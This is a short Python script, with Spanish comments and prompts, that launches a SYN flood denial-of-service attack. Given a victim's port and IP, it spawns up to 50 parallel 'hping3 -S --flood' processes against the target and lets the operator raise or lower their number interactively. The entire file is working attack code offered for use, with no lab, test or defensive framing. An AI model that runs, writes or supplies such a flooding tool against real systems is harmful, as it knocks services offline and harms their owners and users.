# Llamar este ejecutable con el puerto y la IP de la víctima como primer y segundo argumento, respectivamente.

import atexit
import re
import socket
import subprocess
import sys


def run_attacker(victim_port: str, victim_ip: str):
    do_continue = True
    no_processes = 0
    processes = list()

    def cleanup():
        print("Terminando procesos iniciados.")
        while processes:
            processes.pop().terminate()

    atexit.register(cleanup)

    while do_continue:
        # Ask how many inputs do you want.
        print(f"Actualmente hay {no_processes} procesos.")
        print("Ingrese el número de procesos de ataque que desea que existan:")
        new_no_processes = int(input())
        if new_no_processes == no_processes:
            print("Ya hay ese número de procesos activos.")
        elif new_no_processes < 0 or new_no_processes > 50:
            print("Sólo se permiten de 0 a 50 procesos activos.")
        else:
            dif_no_processes = abs(new_no_processes - no_processes)
            if new_no_processes > no_processes:
                print(f"Iniciando {dif_no_processes} procesos de ataque.")
                for _ in range(dif_no_processes):
                    processes.append(subprocess.Popen(["hping3", "-S", "--flood", "-V", "-p", victim_port, victim_ip]))
                print(f"Se iniciaron {dif_no_processes} procesos de ataque satisfactoriamente.")
            else:
                print(f"Deteniendo {dif_no_processes} procesos de ataque.")
                for _ in range(dif_no_processes):
                    processes.pop().terminate()
                print(f"Se detuvieron {dif_no_processes} procesos de ataque satisfactoriamente.")
            no_processes = new_no_processes


if __name__ == "__main__":
    # Check that first argument is int.
    int(sys.argv[1])
    # Check that second argument is ip format.
    socket.inet_aton(sys.argv[2])

    run_attacker(sys.argv[1], sys.argv[2])
